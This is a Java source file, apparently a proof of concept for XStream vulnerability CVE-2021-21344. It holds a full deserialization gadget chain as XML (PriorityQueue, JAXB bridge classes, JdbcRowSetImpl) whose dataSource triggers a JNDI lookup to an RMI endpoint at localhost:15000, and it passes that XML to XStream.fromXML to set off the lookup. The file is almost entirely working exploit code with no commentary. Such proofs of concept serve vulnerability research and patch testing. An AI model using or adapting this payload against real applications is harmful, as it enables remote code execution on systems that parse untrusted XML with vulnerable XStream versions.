package com.r17a.xstream.cve.priorityqueue;

import com.thoughtworks.xstream.XStream;

public class CVE_2021_21344 {
    public static void main(String[] args) {
        String xml = "<java.util.PriorityQueue serialization='custom'>\n" +
                "  <unserializable-parents/>\n" +
                "  <java.util.PriorityQueue>\n" +
                "    <default>\n" +
                "      <size>2</size>\n" +
                "      <comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'>\n" +
                "        <indexMap class='com.sun.xml.internal.ws.client.ResponseContext'>\n" +
                "          <packet>\n" +
                "            <message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'>\n" +
                "              <dataSource class='com.sun.xml.internal.ws.message.JAXBAttachment'>\n" +
                "                <bridge class='com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'>\n" +
                "                  <bridge class='com.sun.xml.internal.bind.v2.runtime.BridgeImpl'>\n" +
                "                    <bi class='com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'>\n" +
                "                      <jaxbType>com.sun.rowset.JdbcRowSetImpl</jaxbType>\n" +
                "                      <uriProperties/>\n" +
                "                      <attributeProperties/>\n" +
                "                      <inheritedAttWildcard class='com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'>\n" +
                "                        <getter>\n" +
                "                          <class>com.sun.rowset.JdbcRowSetImpl</class>\n" +
                "                          <name>getDatabaseMetaData</name>\n" +
                "                          <parameter-types/>\n" +
                "                        </getter>\n" +
                "                      </inheritedAttWildcard>\n" +
                "                    </bi>\n" +
                "                    <tagName/>\n" +
                "                    <context>\n" +
                "                      <marshallerPool class='com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'>\n" +
                "                        <outer-class reference='../..'/>\n" +
                "                      </marshallerPool>\n" +
                "                      <nameList>\n" +
                "                        <nsUriCannotBeDefaulted>\n" +
                "                          <boolean>true</boolean>\n" +
                "                        </nsUriCannotBeDefaulted>\n" +
                "                        <namespaceURIs>\n" +
                "                          <string>1</string>\n" +
                "                        </namespaceURIs>\n" +
                "                        <localNames>\n" +
                "                          <string>UTF-8</string>\n" +
                "                        </localNames>\n" +
                "                      </nameList>\n" +
                "                    </context>\n" +
                "                  </bridge>\n" +
                "                </bridge>\n" +
                "                <jaxbObject class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'>\n" +
                "                  <javax.sql.rowset.BaseRowSet>\n" +
                "                    <default>\n" +
                "                      <concurrency>1008</concurrency>\n" +
                "                      <escapeProcessing>true</escapeProcessing>\n" +
                "                      <fetchDir>1000</fetchDir>\n" +
                "                      <fetchSize>0</fetchSize>\n" +
                "                      <isolation>2</isolation>\n" +
                "                      <maxFieldSize>0</maxFieldSize>\n" +
                "                      <maxRows>0</maxRows>\n" +
                "                      <queryTimeout>0</queryTimeout>\n" +
                "                      <readOnly>true</readOnly>\n" +
                "                      <rowSetType>1004</rowSetType>\n" +
                "                      <showDeleted>false</showDeleted>\n" +
                "                      <dataSource>rmi://localhost:15000/CallRemoteMethod</dataSource>\n" +
                "                      <params/>\n" +
                "                    </default>\n" +
                "                  </javax.sql.rowset.BaseRowSet>\n" +
                "                  <com.sun.rowset.JdbcRowSetImpl>\n" +
                "                    <default>\n" +
                "                      <iMatchColumns>\n" +
                "                        <int>-1</int>\n" +
                "                        <int>-1</int>\n" +
                "                        <int>-1</int>\n" +
                "                        <int>-1</int>\n" +
                "                        <int>-1</int>\n" +
                "                        <int>-1</int>\n" +
                "                        <int>-1</int>\n" +
                "                        <int>-1</int>\n" +
                "                        <int>-1</int>\n" +
                "                        <int>-1</int>\n" +
                "                      </iMatchColumns>\n" +
                "                      <strMatchColumns>\n" +
                "                        <string>foo</string>\n" +
                "                        <null/>\n" +
                "                        <null/>\n" +
                "                        <null/>\n" +
                "                        <null/>\n" +
                "                        <null/>\n" +
                "                        <null/>\n" +
                "                        <null/>\n" +
                "                        <null/>\n" +
                "                        <null/>\n" +
                "                      </strMatchColumns>\n" +
                "                    </default>\n" +
                "                  </com.sun.rowset.JdbcRowSetImpl>\n" +
                "                </jaxbObject>\n" +
                "              </dataSource>\n" +
                "            </message>\n" +
                "            <satellites/>\n" +
                "            <invocationProperties/>\n" +
                "          </packet>\n" +
                "        </indexMap>\n" +
                "      </comparator>\n" +
                "    </default>\n" +
                "    <int>3</int>\n" +
                "    <string>javax.xml.ws.binding.attachments.inbound</string>\n" +
                "    <string>javax.xml.ws.binding.attachments.inbound</string>\n" +
                "  </java.util.PriorityQueue>\n" +
                "</java.util.PriorityQueue>";
        XStream xStream = new XStream();
        Object object = xStream.fromXML(xml);

    }

}
